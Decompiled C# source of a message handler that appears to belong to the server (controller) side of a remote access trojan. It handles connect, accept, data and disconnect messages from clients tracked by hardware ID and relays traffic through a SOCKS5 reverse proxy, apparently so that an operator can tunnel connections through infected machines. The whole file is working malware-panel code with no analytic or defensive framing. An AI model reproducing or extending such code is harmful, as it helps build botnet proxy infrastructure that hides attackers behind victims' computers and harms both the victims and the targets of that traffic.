using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper.Sock5;

namespace Server.Messages
{
	// Token: 0x02000058 RID: 88
	internal class HandlerReverseProxy
	{
		// Token: 0x060001E6 RID: 486 RVA: 0x0001E1B8 File Offset: 0x0001C3B8
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Accept"))
				{
					if (!(a == "ConnectResponse"))
					{
						if (!(a == "Data"))
						{
							if (!(a == "Disconnect"))
							{
								return;
							}
							if (client.Tag == null)
							{
								client.Disconnect();
								return;
							}
							Client client2 = (Client)client.Tag;
							if (client2 == null)
							{
								return;
							}
							client2.Disconnect();
							return;
						}
						else
						{
							if (client.Tag == null)
							{
								client.Disconnect();
								return;
							}
							Client client3 = (Client)client.Tag;
							if (client3 == null)
							{
								return;
							}
							client3.Send((byte[])objects[2]);
							return;
						}
					}
					else
					{
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						Client client4 = (Client)client.Tag;
						if (client4 != null)
						{
							client4.HandleCommandResponse(objects);
						}
						client.Tag = client4;
						return;
					}
				}
				else
				{
					FormReverseProxy formReverseProxy = (FormReverseProxy)Application.OpenForms["ReverseProxy:" + (string)objects[3]];
					if (formReverseProxy == null)
					{
						client.Disconnect();
						return;
					}
					Client client5 = formReverseProxy.server.Search((int)objects[2]);
					if (client5 != null)
					{
						client5.Accept(client);
					}
					client.Tag = client5;
					return;
				}
			}
			else
			{
				FormReverseProxy form = (FormReverseProxy)Application.OpenForms["ReverseProxy:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Reverse Proxy [" + (string)objects[2] + "]";
					form.client = client;
					form.server = new Server.Helper.Sock5.Server(client);
					form.Activea();
					form.GridIps.Enabled = true;
					form.rjButton1.Enabled = true;
					form.rjTextBox1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
